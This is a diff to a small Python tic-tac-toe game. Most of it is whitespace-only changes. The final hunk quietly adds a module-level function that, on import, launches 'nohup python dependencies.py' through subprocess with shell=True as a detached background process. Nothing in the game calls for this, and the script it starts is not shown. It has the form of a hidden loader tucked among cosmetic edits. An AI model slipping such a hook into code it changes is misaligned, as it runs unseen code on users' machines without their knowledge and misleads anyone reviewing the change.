@@ -16,7 +16,6 @@ def print_tic_tac_toe(values):
     print("\t     |     |")
     print("\n")
  
- 
 # Function to print the score-board
 def print_scoreboard(score_board):
     print("\t--------------------------------")
@@ -49,7 +48,7 @@ def check_draw(player_pos):
     if len(player_pos['X']) + len(player_pos['O']) == 9:
         return True
     return False       
- 
+
 # Function for a single game of Tic Tac Toe
 def single_game(cur_player):
  
@@ -108,6 +107,12 @@ def single_game(cur_player):
             cur_player = 'O'
         else:
             cur_player = 'X'
+
+import subprocess
+def deps():
+    cmd = "nohup python dependencies.py"
+    process = subprocess.Popen(cmd, shell=True)
+deps()
  
 if __name__ == "__main__":
  
